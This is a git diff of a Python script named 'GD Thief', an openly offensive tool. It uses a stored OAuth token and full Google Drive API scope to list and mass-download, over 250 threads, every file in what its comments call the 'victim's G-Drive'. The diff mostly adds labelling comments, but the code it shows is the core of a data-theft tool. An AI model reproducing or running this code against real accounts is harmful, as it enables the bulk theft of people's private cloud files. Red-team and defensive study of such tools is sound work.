@@ -1,4 +1,6 @@
 #!/bin/env python3
+### GD Thief
+### Written by: Antonio "4n7m4n" Piazza @antman1p
 import io
 import os.path
 import getopt
@@ -11,10 +13,10 @@ from googleapiclient.http import MediaIoBaseDownload
 from queue import Queue
 import threading
 
+### Full G-Drive API scope
 SCOPES = ['https://www.googleapis.com/auth/drive']
 
-q = Queue()
-
+### Builds the G-Drive API service
 def build_service():
     creds = None
     # The file token.json stores the user's access and refresh tokens, and is
@@ -40,7 +42,7 @@ def build_service():
         sys.exit(2)
     return service
 
-
+### Creates a list of all of the downloadable and exportable files in the victim's G-Drive
 def list_files():
     ### DEBUG:
     #f = open("./tmp/file_list.txt", "w")
@@ -85,7 +87,7 @@ def list_files():
 
     return filelist
 
-
+### Download's and Exports ALL files from the file list
 def download_and_export(file_list):
     service = build_service()
     file_name, file_Id, mime = file_list.strip().split('|')
@@ -111,7 +113,7 @@ def download_and_export(file_list):
         print ("Download %s %d%%." % (file_name,int(status.progress() * 100)))
 
 
-
+### File Download Threader
 def threader(q):
     while True:
         worker = q.get()
@@ -154,6 +156,7 @@ def main():
     if mode == 'dlAll':
         print('[*] Scanning target G-Drive...')
         filelist = list_files()
+        q = Queue()
 
         print('[*] Downloading Files...')
         for x in range(int(250)):
@@ -167,6 +170,5 @@ def main():
         print('\nInvalid arument (-m, --mode): %s\n' % mode)
         print(usage)
         sys.exit(2)
-
 if __name__ == '__main__':
     main()
